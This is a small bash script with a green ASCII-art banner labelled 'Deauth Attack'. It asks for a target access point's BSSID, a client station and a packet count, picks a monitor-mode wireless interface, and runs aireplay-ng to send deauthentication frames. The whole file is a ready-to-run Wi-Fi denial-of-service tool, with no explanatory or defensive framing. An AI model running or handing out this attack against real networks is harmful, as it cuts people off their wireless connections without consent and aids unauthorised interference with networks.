#!/bin/bash

clear
tput setaf 2

menu="
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⡄
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣷⣶⣏⡀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠁
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⡿⠋⢀⣴⣦⠀⢀
            ⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡛⠿⠿⠿⠟⠋⠁⢀⣠⣿⣿⣿⣿⣧⣤⡤
            ⢸⡟⠉⠉⠉⠛⠛⠛⠛⠛⠛⠛⠛⠛⠋⠉⠉⠙⣿⡆⠀⠀⠀⢠⣴⣿⣿⣿⣿⣿⠿⠛⠋
            ⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢰⣿⣿⣿⣿⣿⠟⠃
            ⣽⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠈⠙⠛⠛⠉
            ⣿⡇⠀⠀⠀⠀⣠⠤⠶⠒⠲⢦⣤⣀⠀⠀⠀⠀⣿⡇
            ⣿⡇⠀⠀⣰⠏⣡⠴⢒⣒⣲⡞⠥⣌⢳⡄⠀⠀⣿⡇
            ⢸⡇⠀⠀⣿⠀⠐⢚⣭⡽⠯⢍⠓⠀⠀⡿⠀⠀⣿⡇
            ⢸⡇⠀⠀⠘⢦⡀⣰⠟⠓⠂⠀⠀⣀⡼⠁⠀⠀⣿⡇
            ⢺⡇⠀⠀⠀⠀⠉⠙⠒⠒⠒⠒⠋⠁⠀⠀⠀⠀⣿⡇
            ⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇
            ⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇
            ⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇
            ⢼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇
            ⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇
            ⠈⠛⠷⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠞⠋
            
                Deauth  Attack

--------------------------------------------------------
"

echo -e "$menu"

read -p "Enter the target's bssid: " bssid
read -p "Enter the target's station: " client
read -p "Enter attack size:" deauth 

get_interface_name() {
    if ip link show | grep -q wlan0mon; then
        echo "wlan0mon"
    elif ip link show | grep -q wlo1mon; then
        echo "wlo1mon"
    else
        iface=$(ip link show | grep -o 'wl[a-z0-9]*' | head -n 1)
        if [ -z "$iface" ]; then
            echo "No wireless interface found."
            exit 1
        else
            echo "${iface}mon"
        fi
    fi
}

interface=$(get_interface_name)

if aireplay-ng --deauth "$deauth" -a "$bssid" -c "$client" "$interface"; then
    echo "Deauth attack completed successfully."
else
    echo "Deauth attack failed."
fi

read -p "Press any key to exit..."